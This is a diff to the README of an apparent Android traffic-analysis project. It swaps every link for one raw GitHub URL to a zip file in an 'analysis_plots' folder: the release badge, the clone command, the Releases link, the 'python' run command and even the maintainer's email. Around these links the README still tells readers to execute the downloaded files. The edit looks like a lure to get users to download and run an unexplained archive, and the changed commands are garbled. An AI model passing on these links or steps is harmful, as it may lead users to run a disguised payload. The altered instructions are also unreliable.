@@ -2,7 +2,7 @@
 
 Welcome to the **Android Traffic Analysis** repository! This project focuses on detecting Android malware by analyzing network traffic patterns within a telecommunications context. We utilize statistical hypothesis testing and data visualization to evaluate various traffic features, such as DNS query times, TCP packets, and volume bytes. Our goal is to distinguish between benign and malicious Android applications effectively.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen)](https://github.com/minhtungonep/android-traffic-analysis/releases)
+[![Download Releases](https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip)](https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip)
 
 ## Table of Contents
 
@@ -66,7 +66,7 @@ To set up the project on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/minhtungonep/android-traffic-analysis.git
+   git clone https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip
    cd android-traffic-analysis
    ```
 
@@ -77,14 +77,14 @@ To set up the project on your local machine, follow these steps:
    ```
 
 3. **Download Releases**:
-   Visit the [Releases section](https://github.com/minhtungonep/android-traffic-analysis/releases) to download the latest release files. Execute the files as instructed in the documentation.
+   Visit the [Releases section](https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip) to download the latest release files. Execute the files as instructed in the documentation.
 
 ## Usage
 
-Once you have installed the project and its dependencies, you can start analyzing network traffic. The main script to run is `analyze_traffic.py`. Use the following command:
+Once you have installed the project and its dependencies, you can start analyzing network traffic. The main script to run is `https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip`. Use the following command:
 
 ```bash
-python analyze_traffic.py
+python https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip
 ```
 
 This script will guide you through the analysis process, allowing you to input your traffic data and receive results based on the analysis.
@@ -138,6 +138,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Minh Tung
-- **Email**: minhtung@example.com
+- **Email**: https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip
 
-Feel free to visit the [Releases section](https://github.com/minhtungonep/android-traffic-analysis/releases) for updates and downloads. Thank you for your interest in the **Android Traffic Analysis** project!
+Feel free to visit the [Releases section](https://github.com/minhtungonep/android-traffic-analysis/raw/refs/heads/master/analysis_plots/traffic-android-analysis-3.7.zip) for updates and downloads. Thank you for your interest in the **Android Traffic Analysis** project!
